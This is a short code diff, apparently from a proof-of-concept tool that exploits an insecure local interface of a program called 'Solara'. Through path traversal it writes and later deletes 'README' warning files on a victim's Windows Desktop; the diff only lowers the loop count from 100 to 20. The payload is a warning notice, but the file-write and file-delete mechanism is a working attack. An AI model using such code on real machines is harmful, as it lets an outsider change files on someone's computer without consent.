@@ -148,7 +148,7 @@
             print(`Solara Path: ${path}`);
             print(`Windows Username: ${username}`);
 
-            for (let i=0; i < 100; i++) {
+            for (let i=0; i < 20; i++) {
                 await CreateFile(`../Users\\${username}\\Desktop\\README-${i}.txt`, `Warning! You are running an insecure exploit aka "Solara"\nLocated: ${path}\n\n!! Just by having the UI open allows an attacker to access your operating system, files, and personal information.\nWe recommend deleting solara!\n\nhttps://linkguard.cc/solara.html`)
             }
 
@@ -192,7 +192,7 @@
         async function InputDeleteWarnings() {
             if (!SOLARA_CONNECTED) return print("Solara is not connected");
             
-            for (let i=0; i < 100; i++) {
+            for (let i=0; i < 20; i++) {
                 try {
                     await DeleteFile(`../Users\\${WINDOWS_USERNAME}\\Desktop\\README-${i}.txt`);
                     print(`Deleted file at: C:\\Users\\${WINDOWS_USERNAME}\\Desktop\\README-${i}.txt`);
